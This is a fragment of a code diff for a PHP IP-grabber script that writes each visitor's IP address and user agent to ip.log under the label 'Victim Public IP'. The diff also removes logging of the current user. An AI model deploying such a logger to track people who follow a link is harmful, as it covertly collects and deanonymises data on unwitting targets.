@@ -14,21 +14,15 @@ else
     }
 
 $browser = $_SERVER['HTTP_USER_AGENT'];
-$useragent = " User-Agent: " . $browser;
-
-$user = get_current_user(); 
+$useragent = "User-Agent " . $browser . "\r\n"; 
 
 $file = 'ip.log';  //this is the file to which the IP address will be written; name it your way.
-$victim = "Victim Public IP: ";
-
-$currentuser = "\r\n" . "\r\n" . "Current logged in user: " . $user;
+$victim = "Victim Public IP ";
 
 $fp = fopen($file, 'a');
 
 fwrite($fp, $victim);
 fwrite($fp, $ipaddress);
 fwrite($fp, $useragent);
-fwrite($fp, $currentuser);
-
 
 fclose($fp);
